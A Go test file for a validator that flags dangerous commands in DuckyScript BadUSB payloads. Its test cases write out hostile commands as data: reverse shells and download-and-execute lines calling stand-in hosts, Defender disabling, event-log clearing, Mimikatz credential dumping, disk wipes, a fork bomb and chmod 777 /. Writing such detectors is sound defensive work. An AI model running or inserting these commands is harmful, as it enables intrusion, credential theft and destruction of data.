package validator

import (
	"strings"
	"testing"
)

func TestValidate_BenignPayload(t *testing.T) {
	src := `REM simple hello world
DELAY 1000
STRING Hello, world!
ENTER
`
	rep := Validate("hello.txt", src)
	if len(rep.Findings) != 0 {
		t.Fatalf("want 0 findings, got %d: %+v", len(rep.Findings), rep.Findings)
	}
	if rep.Severity != SeverityInfo {
		t.Errorf("severity=%v want info", rep.Severity)
	}
}

func TestValidate_RmRfRootIsCritical(t *testing.T) {
	src := `DELAY 500
STRING rm -rf /
ENTER
`
	rep := Validate("wipe.txt", src)
	if rep.Severity != SeverityCritical {
		t.Fatalf("severity=%v want critical", rep.Severity)
	}
	if !rep.Has(SeverityCritical) {
		t.Error("Has(SeverityCritical) should be true")
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "rm_rf_root" {
			found = true
			if f.Line != 2 {
				t.Errorf("line=%d want 2", f.Line)
			}
		}
	}
	if !found {
		t.Errorf("expected rm_rf_root finding, got %+v", rep.Findings)
	}
}

func TestValidate_SkipsREMCommentsAndLowercase(t *testing.T) {
	// REM lines are comments; lowercase first-tokens aren't DuckyScript
	// opcodes so the whole line is scanned. The REM line should NOT
	// trigger; the lowercase one SHOULD.
	src := `REM rm -rf /
something rm -rf /
`
	rep := Validate("mixed.txt", src)
	var lines []int
	for _, f := range rep.Findings {
		if f.Rule == "rm_rf_root" {
			lines = append(lines, f.Line)
		}
	}
	if len(lines) != 1 {
		t.Fatalf("want exactly 1 rm_rf_root hit, got lines %v (all findings: %+v)", lines, rep.Findings)
	}
	if lines[0] != 2 {
		t.Errorf("hit on line %d, want 2 (REM line should be skipped)", lines[0])
	}
}

func TestValidate_ReverseShellDetection(t *testing.T) {
	cases := map[string]string{
		"bash_tcp": `STRING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		"nc_e":     `STRING nc -lvp 4444 10.0.0.1 4444 -e /bin/sh`,
		"python":   `STRING python -c "import socket; s=socket.socket(); s.connect(('x', 1))"`,
		"pwsh":     `STRING powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://x/p')"`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			rep := Validate(name, src)
			if rep.Severity != SeverityCritical {
				t.Errorf("severity=%v want critical; findings=%+v", rep.Severity, rep.Findings)
			}
		})
	}
}

func TestValidate_PersistenceIsWarn(t *testing.T) {
	src := `STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d C:\evil.exe`
	rep := Validate("persist.txt", src)
	if rep.Severity != SeverityWarn {
		t.Fatalf("severity=%v want warn", rep.Severity)
	}
}

func TestValidate_DefenseDisableIsCritical(t *testing.T) {
	src := `STRING Set-MpPreference -DisableRealtimeMonitoring $true`
	rep := Validate("defender.txt", src)
	if rep.Severity != SeverityCritical {
		t.Fatalf("severity=%v want critical", rep.Severity)
	}
}

// TestValidate_LOLBASRules exercises the LOLBAS download/execute and
// lateral-execution patterns. Each is a real, well-documented attack
// technique a DuckyScript payload can type into the target — the
// validator must catch them all so /validate flags the script before
// the operator approves badusb_run.
func TestValidate_LOLBASRules(t *testing.T) {
	cases := []struct {
		rule string
		line string
	}{
		{"certutil_download", `STRING certutil -urlcache -split -f https://evil.example/x.exe c:\x.exe`},
		{"bitsadmin_download", `STRING bitsadmin /transfer evil https://evil.example/x.exe c:\x.exe`},
		{"mshta_remote", `STRING mshta https://evil.example/x.hta`},
		{"mshta_remote", `STRING mshta vbscript:CreateObject("Wscript.Shell").Run("calc")`},
		{"regsvr32_squiblydoo", `STRING regsvr32 /s /n /u /i:https://evil.example/x.sct scrobj.dll`},
		{"wmic_exec", `STRING wmic /node:victim process call create "calc.exe"`},
	}
	for _, tc := range cases {
		t.Run(tc.rule, func(t *testing.T) {
			rep := Validate("lol.txt", tc.line+"\n")
			if rep.Severity != SeverityCritical {
				t.Fatalf("severity=%v want critical", rep.Severity)
			}
			found := false
			for _, f := range rep.Findings {
				if f.Rule == tc.rule {
					found = true
				}
			}
			if !found {
				t.Errorf("expected rule %q in findings, got %+v", tc.rule, rep.Findings)
			}
		})
	}
}

// TestValidate_DefenseEvasionAndCredDump exercises the rules added for
// Windows event-log clearing, PowerShell -EncodedCommand, Linux firewall
// flush, and Mimikatz credential dumping. All four are common BadUSB
// signals that previously slipped past the validator entirely.
func TestValidate_DefenseEvasionAndCredDump(t *testing.T) {
	cases := []struct {
		rule string
		line string
		want Severity
	}{
		{"clear_eventlog_wevtutil", `STRING wevtutil cl Security`, SeverityCritical},
		{"clear_eventlog_wevtutil", `STRING wevtutil cl System`, SeverityCritical},
		{"clear_eventlog_ps", `STRING Clear-EventLog -LogName Security`, SeverityCritical},
		{"powershell_enc", `STRING powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==`, SeverityCritical},
		{"powershell_enc", `STRING powershell.exe -EncodedCommand SQBuAHYAbwBrAGUA`, SeverityCritical},
		{"iptables_flush", `STRING iptables -F`, SeverityWarn},
		{"iptables_flush", `STRING iptables --flush`, SeverityWarn},
		{"ufw_disable", `STRING ufw disable`, SeverityWarn},
		{"mimikatz_logonpasswords", `STRING privilege::debug; sekurlsa::logonpasswords`, SeverityCritical},
		{"mimikatz_dcsync", `STRING lsadump::dcsync /user:Administrator`, SeverityCritical},
	}
	for _, tc := range cases {
		t.Run(tc.rule, func(t *testing.T) {
			rep := Validate("evade.txt", tc.line+"\n")
			if rep.Severity != tc.want {
				t.Fatalf("severity=%v want %v (findings=%+v)", rep.Severity, tc.want, rep.Findings)
			}
			found := false
			for _, f := range rep.Findings {
				if f.Rule == tc.rule {
					found = true
				}
			}
			if !found {
				t.Errorf("expected rule %q in findings, got %+v", tc.rule, rep.Findings)
			}
		})
	}
}

// TestValidate_BlockDeviceWipe locks the dd-to-block-device guard. A
// payload that types `dd if=/dev/zero of=/dev/sda` is functionally
// equivalent to mkfs on the primary disk — same critical tier.
func TestValidate_BlockDeviceWipe(t *testing.T) {
	cases := []string{
		"STRING dd if=/dev/zero of=/dev/sda bs=1M",
		"STRING dd if=/dev/urandom of=/dev/nvme0n1",
		"STRING dd if=/dev/random of=/dev/mmcblk0",
	}
	for _, src := range cases {
		t.Run(src, func(t *testing.T) {
			rep := Validate("wipe.txt", src+"\n")
			if rep.Severity != SeverityCritical {
				t.Fatalf("severity=%v want critical for %q", rep.Severity, src)
			}
			found := false
			for _, f := range rep.Findings {
				if f.Rule == "dd_block_wipe" {
					found = true
				}
			}
			if !found {
				t.Errorf("expected dd_block_wipe rule for %q, got %+v", src, rep.Findings)
			}
		})
	}
}

// TestValidate_ForkBomb covers the canonical bash fork bomb. Pure DoS,
// not data-loss, but instantly unrecoverable on the target — critical
// tier matches the existing "rm -rf /" precedent for unrecoverable
// effect.
func TestValidate_ForkBomb(t *testing.T) {
	src := `STRING :(){ :|:& };:` + "\n"
	rep := Validate("bomb.txt", src)
	if rep.Severity != SeverityCritical {
		t.Fatalf("severity=%v want critical", rep.Severity)
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "fork_bomb" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected fork_bomb finding, got %+v", rep.Findings)
	}
}

// TestValidate_Chmod777Root catches the recursive world-writable chmod
// on /. Doesn't destroy data outright but breaks every privilege
// boundary on the system — same critical tier as defense_disable rules.
func TestValidate_Chmod777Root(t *testing.T) {
	cases := []string{
		"STRING chmod 777 /",
		"STRING chmod -R 777 /",
		"STRING chmod 0777 /",
	}
	for _, src := range cases {
		t.Run(src, func(t *testing.T) {
			rep := Validate("perms.txt", src+"\n")
			if rep.Severity != SeverityCritical {
				t.Fatalf("severity=%v want critical for %q", rep.Severity, src)
			}
			found := false
			for _, f := range rep.Findings {
				if f.Rule == "chmod_777_root" {
					found = true
				}
			}
			if !found {
				t.Errorf("expected chmod_777_root for %q, got %+v", src, rep.Findings)
			}
		})
	}
}

func TestValidate_LongTypingIsInfoOnly(t *testing.T) {
	var b strings.Builder
	for i := 0; i < 500; i++ {
		b.WriteString("STRING " + strings.Repeat("x", 10) + "\n")
	}
	rep := Validate("long.txt", b.String())
	if rep.Severity != SeverityInfo {
		t.Fatalf("severity=%v want info", rep.Severity)
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "long_typing" {
			found = true
		}
	}
	if !found {
		t.Error("expected long_typing finding")
	}
}

func TestReport_RenderText(t *testing.T) {
	rep := Validate("bad.txt", "STRING rm -rf /\n")
	out := rep.RenderText()
	if !strings.Contains(out, "critical") {
		t.Errorf("rendered output missing severity tag: %s", out)
	}
	if !strings.Contains(out, "rm -rf /") {
		t.Errorf("rendered output missing excerpt: %s", out)
	}
}

func TestReport_EmptyRenderText(t *testing.T) {
	rep := Validate("clean.txt", "DELAY 100\nSTRING hi\n")
	out := rep.RenderText()
	if !strings.Contains(out, "no findings") {
		t.Errorf("empty-report render should say 'no findings': %s", out)
	}
}
